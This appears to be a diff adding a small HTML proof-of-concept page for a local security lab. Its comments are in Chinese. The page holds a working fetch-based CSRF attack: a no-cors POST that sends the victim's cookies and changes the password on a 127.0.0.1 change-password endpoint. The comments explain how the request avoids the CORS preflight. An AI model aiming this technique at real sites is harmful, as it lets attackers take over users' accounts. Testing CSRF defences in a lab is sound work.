@@ -1,0 +1,24 @@
+<!doctype html>
+<html lang="zh-CN"><head><meta charset="utf-8"><title>POC2 fetch 型 CSRF</title></head>
+<body>
+<!--
+  POC2：fetch + no-cors
+  目标接口：POST /api/change-password（表单编码）
+  关键点：body 是 URLSearchParams => Content-Type 为 application/x-www-form-urlencoded，
+          属于"简单请求"，不触发 CORS 预检；credentials:"include" 让浏览器带上会话 Cookie。
+  预期：main 上改密成功（响应读不到，但副作用已发生）；防御分支返回 403。
+  仅限本机靶场使用。
+-->
+<h1>POC2：fetch 型 CSRF（本地实验）</h1>
+<button id="go">触发实验请求</button>
+<script>
+document.getElementById("go").onclick = () => {
+  fetch("http://127.0.0.1:5000/api/change-password", {
+    method: "POST",
+    mode: "no-cors",
+    credentials: "include",
+    body: new URLSearchParams({ new_password: "ChangedByCSRF123!" }),
+  });
+};
+</script>
+</body></html>
